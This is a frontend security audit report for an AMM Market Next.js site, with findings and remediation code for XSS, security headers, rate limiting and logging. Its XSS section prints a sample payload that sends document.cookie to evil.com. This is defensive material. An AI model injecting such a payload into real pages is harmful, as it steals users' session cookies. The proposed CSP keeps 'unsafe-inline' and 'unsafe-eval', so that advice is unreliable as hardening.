# Security Audit Report

**Audit Date:** January 20, 2026  
**Auditor Role:** Staff Engineer  
**Codebase:** AMM Market Landing Page & Developer Documentation  
**Overall Security Score:** 65/100

---

## Executive Summary

This security audit identifies vulnerabilities in the AMM Market frontend codebase. While the application does not handle direct smart contract interactions or user funds on the frontend, several security issues require remediation before public launch.

---

## High Severity Issues

### 1. XSS Vulnerability via dangerouslySetInnerHTML

**File:** `src/components/markdown-content.tsx`  
**Line:** 30  
**Severity:** HIGH  
**CVSS Score:** 7.5

#### Current Code (Vulnerable)
```typescript
dangerouslySetInnerHTML={{ __html: html }}
```

The `marked.parse()` output is rendered directly without sanitization. If user-supplied content ever reaches this component (e.g., via URL params, CMS, or API), attackers could inject malicious scripts.

#### Attack Vector
```markdown
# Malicious Input
<script>document.location='https://evil.com/steal?cookie='+document.cookie</script>
<img src=x onerror="alert('XSS')">
```

#### Remediation
Install DOMPurify and sanitize all HTML output:

```bash
npm install dompurify
npm install -D @types/dompurify
```

**Fixed Code:**
```typescript
"use client"

import { useEffect, useState } from "react"
import { marked } from "marked"
import DOMPurify from "dompurify"

interface MarkdownContentProps {
  content?: string
}

/**
 * Safely renders markdown content with XSS protection.
 * All HTML is sanitized through DOMPurify before rendering.
 */
export default function MarkdownContent({ content = "" }: MarkdownContentProps) {
  const [html, setHtml] = useState("")

  useEffect(() => {
    if (content) {
      try {
        // Parse markdown to HTML
        const rawHtml = marked.parse(content)
        // Sanitize to prevent XSS attacks
        const sanitizedHtml = DOMPurify.sanitize(rawHtml, {
          ALLOWED_TAGS: ['h1', 'h2', 'h3', 'h4', 'h5', 'h6', 'p', 'a', 'ul', 'ol', 'li', 
                        'code', 'pre', 'blockquote', 'strong', 'em', 'table', 'thead', 
                        'tbody', 'tr', 'th', 'td', 'br', 'hr', 'img', 'span', 'div'],
          ALLOWED_ATTR: ['href', 'src', 'alt', 'title', 'class', 'id', 'target', 'rel'],
          ALLOW_DATA_ATTR: false,
          ADD_ATTR: ['target', 'rel'],
          FORBID_TAGS: ['script', 'style', 'iframe', 'form', 'input'],
          FORBID_ATTR: ['onerror', 'onclick', 'onload', 'onmouseover']
        })
        setHtml(sanitizedHtml)
      } catch (error) {
        console.error("Error parsing markdown:", error)
        setHtml("<p>Error rendering content</p>")
      }
    } else {
      setHtml("")
    }
  }, [content])

  return (
    <div
      className="prose prose-lg max-w-none prose-headings:text-blue-900 prose-h1:text-3xl prose-h2:text-2xl prose-h2:mt-8 prose-p:text-gray-700 prose-a:text-blue-600 prose-strong:text-blue-800 prose-strong:font-semibold prose-li:text-gray-700 prose-li:marker:text-blue-500"
      dangerouslySetInnerHTML={{ __html: html }}
    />
  )
}
```

**Status:** REQUIRES IMPLEMENTATION

---

### 2. Missing Security Headers

**File:** `next.config.ts`  
**Severity:** HIGH  
**CVSS Score:** 6.5

The application lacks essential HTTP security headers that protect against common web attacks.

#### Current Configuration
```typescript
const nextConfig: NextConfig = {
  experimental: { turbo: { root: process.cwd() } },
  images: { remotePatterns: [...] }
}
```

#### Required Headers

| Header | Purpose | Value |
|--------|---------|-------|
| Content-Security-Policy | Prevent XSS, clickjacking | See below |
| X-Frame-Options | Prevent clickjacking | DENY |
| X-Content-Type-Options | Prevent MIME sniffing | nosniff |
| Referrer-Policy | Control referrer info | strict-origin-when-cross-origin |
| Permissions-Policy | Limit browser features | See below |
| Strict-Transport-Security | Force HTTPS | max-age=31536000; includeSubDomains |

#### Remediation
Update `next.config.ts`:

```typescript
import type { NextConfig } from "next";

const securityHeaders = [
  {
    key: 'X-DNS-Prefetch-Control',
    value: 'on'
  },
  {
    key: 'Strict-Transport-Security',
    value: 'max-age=31536000; includeSubDomains'
  },
  {
    key: 'X-Frame-Options',
    value: 'DENY'
  },
  {
    key: 'X-Content-Type-Options',
    value: 'nosniff'
  },
  {
    key: 'X-XSS-Protection',
    value: '1; mode=block'
  },
  {
    key: 'Referrer-Policy',
    value: 'strict-origin-when-cross-origin'
  },
  {
    key: 'Permissions-Policy',
    value: 'camera=(), microphone=(), geolocation=(), interest-cohort=()'
  },
  {
    key: 'Content-Security-Policy',
    value: [
      "default-src 'self'",
      "script-src 'self' 'unsafe-inline' 'unsafe-eval'",
      "style-src 'self' 'unsafe-inline'",
      "img-src 'self' data: https: blob:",
      "font-src 'self' data:",
      "connect-src 'self' https:",
      "media-src 'self' https://cdn-front.freepik.com",
      "frame-ancestors 'none'",
    ].join('; ')
  }
];

const nextConfig: NextConfig = {
  experimental: {
    turbo: {
      root: process.cwd(),
    },
  },
  images: {
    remotePatterns: [
      { protocol: "https", hostname: "studio.uxpincdn.com", pathname: "/**" },
      { protocol: "https", hostname: "www.muravie.com", pathname: "/**" },
      { protocol: "https", hostname: "images.unsplash.com", pathname: "/**" },
      { protocol: "https", hostname: "via.placeholder.com", pathname: "/**" },
      { protocol: "https", hostname: "i.pravatar.cc", pathname: "/**" },
    ],
  },
  async headers() {
    return [
      {
        source: '/(.*)',
        headers: securityHeaders,
      },
    ];
  },
};

export default nextConfig;
```

**Status:** REQUIRES IMPLEMENTATION

---

## Medium Severity Issues

### 3. External Resource Dependencies

**Severity:** MEDIUM  
**CVSS Score:** 4.0

The application loads resources from third-party domains that could be compromised or become unavailable.

#### Current External Dependencies

| Resource | Domain | Risk |
|----------|--------|------|
| Demo Video | cdn-front.freepik.com | Third-party CDN compromise |
| Avatar Images | i.pravatar.cc | Service availability |
| Partner Logos | Inline SVGs | LOW - Self-contained |

#### Recommendations

1. **Video Assets:** Host on your own CDN (Vercel, Cloudflare R2, AWS S3)
2. **Avatar Images:** Replace with local placeholder images or use a verified service
3. **Add Subresource Integrity (SRI):** For any remaining external scripts

```typescript
// Example: Self-host critical assets
const testimonials = [
  {
    // Replace external avatars with local
    image: "/images/avatars/vitalik.jpg"
  }
]
```

**Status:** RECOMMENDED

---

### 4. No Rate Limiting on Forms

**Severity:** MEDIUM  
**CVSS Score:** 5.0

Email signup forms lack client-side rate limiting, making them vulnerable to:
- Spam submissions
- Email enumeration attacks
- Resource exhaustion

#### Current Forms (Vulnerable)
- Hero section email signup
- Footer CTA email signup

#### Remediation

**Option A: Client-Side Debounce**
```typescript
// Add to form components
import { useState, useCallback } from 'react';

const useRateLimitedSubmit = (onSubmit: () => void, cooldownMs = 3000) => {
  const [isLimited, setIsLimited] = useState(false);
  const [lastSubmit, setLastSubmit] = useState(0);

  const handleSubmit = useCallback(() => {
    const now = Date.now();
    if (now - lastSubmit < cooldownMs) {
      setIsLimited(true);
      return;
    }
    setLastSubmit(now);
    setIsLimited(false);
    onSubmit();
  }, [lastSubmit, cooldownMs, onSubmit]);

  return { handleSubmit, isLimited };
};
```

**Option B: Vercel Edge Middleware (Recommended)**
Create `middleware.ts` in project root:
```typescript
import { NextResponse } from 'next/server';
import type { NextRequest } from 'next/server';

const rateLimit = new Map<string, { count: number; timestamp: number }>();

export function middleware(request: NextRequest) {
  // Only rate limit API routes
  if (request.nextUrl.pathname.startsWith('/api/')) {
    const ip = request.ip ?? 'anonymous';
    const now = Date.now();
    const windowMs = 60000; // 1 minute
    const maxRequests = 10;

    const record = rateLimit.get(ip);
    
    if (record && now - record.timestamp < windowMs) {
      if (record.count >= maxRequests) {
        return NextResponse.json(
          { error: 'Too many requests' },
          { status: 429 }
        );
      }
      record.count++;
    } else {
      rateLimit.set(ip, { count: 1, timestamp: now });
    }
  }

  return NextResponse.next();
}

export const config = {
  matcher: '/api/:path*',
};
```

**Status:** RECOMMENDED

---

## Low Severity Issues

### 5. Missing Error Tracking

**Severity:** LOW  
**File:** `src/components/error-boundary.tsx`

The error boundary logs to `console.error` but has no production error tracking.

#### Recommendation
Integrate Sentry or similar service:

```typescript
// Add to error-boundary.tsx
import * as Sentry from "@sentry/nextjs";

componentDidCatch(error: Error, errorInfo: ErrorInfo) {
  console.error("Error caught by boundary:", error, errorInfo);
  Sentry.captureException(error, { extra: errorInfo });
}
```

**Status:** RECOMMENDED

---

### 6. Console Logging in Production

**Severity:** LOW  
**Files:** Multiple components

Debug logging should be stripped in production builds.

#### Recommendation
Use environment-aware logging:

```typescript
const logger = {
  error: (...args: unknown[]) => {
    if (process.env.NODE_ENV !== 'production') {
      console.error(...args);
    }
    // In production, send to error tracking service
  },
  debug: (...args: unknown[]) => {
    if (process.env.NODE_ENV === 'development') {
      console.log(...args);
    }
  }
};
```

**Status:** OPTIONAL

---

## Security Checklist

| Check | Status | Priority |
|-------|--------|----------|
| XSS Protection (DOMPurify) | NOT IMPLEMENTED | Critical |
| Security Headers | NOT IMPLEMENTED | Critical |
| HTTPS Enforcement | PLATFORM (Vercel) | N/A |
| Rate Limiting | NOT IMPLEMENTED | High |
| External Resource Audit | PARTIAL | Medium |
| Error Tracking | NOT IMPLEMENTED | Medium |
| Input Validation | PARTIAL | Medium |
| CORS Configuration | DEFAULT | Low |
| Dependency Audit | NOT VERIFIED | Medium |

---

## Dependency Security

Run regular security audits:

```bash
# Check for vulnerabilities
npm audit

# Fix automatically where possible
npm audit fix

# Check for outdated packages
npm outdated
```

### Current Dependencies Risk Assessment

| Package | Version | Known Issues |
|---------|---------|--------------|
| next | 16.1.1 | Latest - OK |
| react | 19.2.3 | Latest - OK |
| marked | 17.0.1 | Latest - OK (but needs sanitization) |
| framer-motion | 12.27.0 | Latest - OK |

---

## Implementation Priority

1. **IMMEDIATE (Before Launch)**
   - [ ] Install DOMPurify and fix XSS vulnerability
   - [ ] Add security headers to next.config.ts

2. **HIGH (First Sprint)**
   - [ ] Implement rate limiting middleware
   - [ ] Self-host video and avatar assets

3. **MEDIUM (Second Sprint)**
   - [ ] Add error tracking (Sentry)
   - [ ] Implement environment-aware logging

4. **ONGOING**
   - [ ] Weekly `npm audit` checks
   - [ ] Quarterly security header review

---

## Compliance Notes

### GDPR Considerations
- Email signup forms collect PII
- Privacy policy link present in footer
- Consider adding cookie consent banner

### Web3 Security Notes
- No wallet connections on frontend (handled separately)
- No private key handling
- No transaction signing
- API integrations should use read-only RPC endpoints

---

## Revision History

| Date | Version | Changes |
|------|---------|---------|
| 2026-01-20 | 1.0 | Initial audit |

---

*This audit was conducted following OWASP Web Security Testing Guide v4.2 guidelines.*
